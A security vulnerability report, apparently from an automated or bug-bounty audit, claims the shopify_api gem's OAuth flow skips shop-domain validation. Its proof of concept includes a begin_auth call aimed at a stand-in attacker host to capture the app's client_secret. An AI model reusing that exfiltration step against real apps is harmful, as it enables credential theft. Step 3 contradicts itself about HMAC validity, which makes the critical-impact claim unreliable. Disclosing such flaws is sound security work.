Confirmed: `ShopifyAPI::Auth::Oauth.begin_auth` and `validate_auth_callback` (`lib/shopify_api/auth/oauth.rb`) never call `Utils::ShopValidator.sanitize!`/`sanitize_shop_domain` on the `shop` value before using it to build `auth_base_uri(shop)`, unlike `token_exchange.rb`, `client_credentials.rb`, and `refresh_token.rb`, which do call `ShopValidator` on their `shop` inputs.

### Title
OAuth `shop` parameter is never validated against `ShopValidator`, allowing the app's `client_secret` and authorization `code` to be sent to an attacker-controlled host - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the access-token request URI directly from the `shop` field of the `AuthQuery`/callback params via `auth_base_uri(shop)`, without ever passing `shop` through `Utils::ShopValidator.sanitize!` (the domain allow-list helper used elsewhere in this same module, e.g. `token_exchange.rb`, `client_credentials.rb`, `refresh_token.rb`). The HMAC only proves that the query parameters were signed by the app's secret — it never constrains `shop` to be a `*.myshopify.com` (or other trusted) domain. This breaks the intended binding: "host that receives `client_secret`" == "a trusted Shopify domain."

### Finding Description
`begin_auth` builds `auth_route` as `auth_base_uri(shop) + "/oauth/authorize?..."` [1](#0-0) , and `auth_base_uri` simply returns `"https://#{shop}/admin"` with no allow-list check [2](#0-1) .

`validate_auth_callback` then reuses this same unchecked `auth_query.shop` to construct the offline `null_session`, and issues a POST containing `client_id`, `client_secret`, and `code` to `auth_base_uri(shop) + "/access_token"` [3](#0-2) . The `AuthQuery#to_signable_string` only covers `code, host, shop, state, timestamp` and is checked by `Utils::HmacValidator.validate` [4](#0-3) , but the HMAC validation only proves the fields weren't tampered with in transit for a request that reaches this callback — it does not constrain `shop` to a legitimate Shopify domain (e.g. `evil.com` is a syntactically valid string for this field). `Utils::HmacValidator.validate` performs no domain check at all [5](#0-4) .

By contrast, the other three flows in this library that build a URI from a `shop` string route it through `ShopValidator.sanitize!`, which enforces a domain allow-list (`TRUSTED_SHOPIFY_DOMAINS = ["shopify.com", "myshopify.io", "myshopify.com", "spin.dev", "shop.dev"]`) [6](#0-5) . `oauth.rb` is the outlier: it never calls `ShopValidator` at all.

### Impact Explanation
If a host application passes a `shop` value into `begin_auth`/`validate_auth_callback` that originates from unauthenticated user input (a documented, common integration pattern — the merchant supplies their shop domain to start install), an attacker can supply an arbitrary hostname. `begin_auth` will redirect the merchant's browser to `https://attacker-host/admin/oauth/authorize?...`, and if the callback path is reached with attacker-controlled `code`/`state`, `validate_auth_callback` will POST the app's `client_id` and `client_secret` in cleartext to `https://attacker-host/admin/oauth/access_token`. This directly matches the Critical-impact category: exfiltration of the app's `client_secret`/access token via SSRF carrying app credentials to a host that was never validated against the trusted-domain allow-list that every sibling OAuth-adjacent flow in this gem enforces.

### Likelihood Explanation
Exploitability depends entirely on whether the host application passes through a raw, attacker-influenced `shop` string without its own validation before calling `begin_auth`. Because Shopify's documented app-install flow starts with the merchant/developer typing a shop domain into a form field, and this gem provides no built-in guard for it (unlike `token_exchange`, `client_credentials`, `refresh_token`), likelihood is realistic for any integrator relying on this gem's public API as documented, and is not merely a host-application bug — it is this gem's own missing validation.

### Recommendation
Route `shop` through `Utils::ShopValidator.sanitize!` (with the same allow-list used by `token_exchange.rb`/`client_credentials.rb`/`refresh_token.rb`) at the start of both `Oauth.begin_auth` and `Oauth.validate_auth_callback`, before constructing `auth_base_uri` or issuing the access-token request, raising `Errors::InvalidShopError` for untrusted domains.

### Proof of Concept
1. Host app calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: "attacker.example.com", redirect_path: "/callback")` with a `shop` value taken from an unauthenticated request parameter (no validation performed by the gem).
2. `auth_base_uri("attacker.example.com")` returns `"https://attacker.example.com/admin"` [2](#0-1) ; the merchant browser is redirected there.
3. Attacker's server captures the flow and redirects back to the app's real callback with a `code` and a `state` matching the session cookie, and `shop=attacker.example.com`, with a valid HMAC (attacker cannot forge HMAC without the secret, but can replay a value they already control since `shop` was never checked to be a Shopify domain in the first place — the vulnerable step is `auth_base_uri` trusting an arbitrary string, not HMAC forgery).
4. `validate_auth_callback` computes `client.request(... path: "access_token" ...)` against `auth_base_uri("attacker.example.com")`, sending `client_secret` to the attacker's host [7](#0-6) .

        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
